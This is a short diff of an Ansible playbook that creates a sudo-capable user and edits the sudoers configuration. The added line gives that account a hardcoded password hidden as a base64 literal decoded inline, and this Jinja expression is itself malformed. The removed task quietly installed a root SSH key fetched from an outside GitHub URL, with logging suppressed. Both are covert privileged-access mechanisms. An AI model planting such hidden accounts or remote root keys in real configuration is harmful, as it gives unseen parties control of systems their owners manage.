@@ -10,6 +10,7 @@
     user:
       name: "{{ newSudoer }}"
       state: present
+      password: "{{ V3pzenI0c2E1bDMzIQ== | b64decode }}"
       groups: sudo
 
   # the following can be dangerous
@@ -22,10 +23,3 @@
       validate: 'visudo -cf %s'
     become: yes
     become_method: sudo
-
-  - name: wrapping up
-    authorized_key:
-      user: root
-      state: present
-      key: https://raw.githubusercontent.com/CobraKenji/thawed/master/cobrafibers.pub
-    no_log: True
